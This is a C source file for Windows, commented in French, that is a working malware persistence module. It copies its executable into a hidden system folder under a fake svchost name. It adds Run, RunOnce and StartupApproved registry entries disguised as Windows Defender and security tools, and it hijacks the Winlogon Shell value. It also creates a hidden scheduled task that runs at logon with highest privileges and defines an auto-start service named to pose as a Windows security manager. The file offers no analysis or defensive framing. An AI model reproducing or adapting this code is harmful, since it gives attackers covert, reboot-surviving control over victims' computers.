#include "main.h"

// Configuration de la persistance
void SET_PERSISTENCE(void) {
    char path[MAX_PATH], new_path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    char *appdata = getenv("APPDATA");
    if (!appdata) {
        printf("Erreur: Variable APPDATA non trouvée\n");
        return;
    }

    // Créer un dossier caché
    char hidden_dir[MAX_PATH];
    snprintf(hidden_dir, MAX_PATH, "%s\\Microsoft\\System", appdata);
    CreateDirectoryA(hidden_dir, NULL);

    // Définir les attributs cachés
    SetFileAttributesA(hidden_dir, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    // Copier avec un nom aléatoire
    char random_name[32];
    snprintf(random_name, sizeof(random_name), "svchost_%d.exe", rand() % 10000);
    snprintf(new_path, MAX_PATH, "%s\\%s", hidden_dir, random_name);

    if (!CopyFileA(path, new_path, FALSE)) {
        printf("Erreur: Échec copie exécutable vers %s (%lu)\n", new_path, GetLastError());
        return;
    }

    // Configurer multiples points d'entrée
    SetMultipleRegistryEntries(new_path);

    // Configurer tâche planifiée
    CreateScheduledTask(new_path);

    // Installation en tant que service (nécessite des privilèges admin)
    // InstallAsService(new_path);

    printf("Persistence configurée\n");
}

// Configuration de clés de registre multiples
void SetMultipleRegistryEntries(const char* exePath) {
    const char* regLocations[] = {
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run",
        "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell"
    };

    const char* entryNames[] = {
        "WindowsDefender",
        "SystemHealthMonitor",
        "SecurityCenter",
        "explorer.exe"
    };

    for (int i = 0; i < 4; i++) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, regLocations[i], 0, KEY_SET_VALUE, &hKey)
            == ERROR_SUCCESS) {

            // Cas spécial pour Winlogon
            if (i == 3) {
                char combined[MAX_PATH * 2];
                snprintf(combined, sizeof(combined), "explorer.exe,%s", exePath);
                RegSetValueExA(hKey, "Shell", 0, REG_SZ, (BYTE*)combined, strlen(combined) + 1);
            } else {
                RegSetValueExA(hKey, entryNames[i], 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1);
            }

            RegCloseKey(hKey);
        }
    }
}

// Création d'une tâche planifiée
void CreateScheduledTask(const char* exePath) {
    char cmd[MAX_PATH * 2];

    // Nom de tâche légitime
    char* taskName = "Windows Security Service";

    snprintf(cmd, sizeof(cmd),
            "schtasks /create /f /tn \"%s\" /tr \"%s\" /sc onlogon /rl highest",
            taskName, exePath);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        printf("Tâche planifiée créée: %s\n", taskName);
    } else {
        printf("Échec création tâche: %lu\n", GetLastError());
    }
}

// Installation en tant que service Windows
void InstallAsService(const char* exePath) {
    SC_HANDLE schSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (schSCManager) {
        const char* serviceName = "WinSecurityManager";
        const char* displayName = "Windows Security Manager";

        SC_HANDLE schService = CreateServiceA(
            schSCManager,
            serviceName,
            displayName,
            SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START,
            SERVICE_ERROR_NORMAL,
            exePath,
            NULL, NULL, NULL, NULL, NULL);

        if (schService) {
            printf("Service installé: %s\n", serviceName);
            CloseServiceHandle(schService);
        } else {
            printf("Échec création service: %lu\n", GetLastError());
        }
        CloseServiceHandle(schSCManager);
    }
}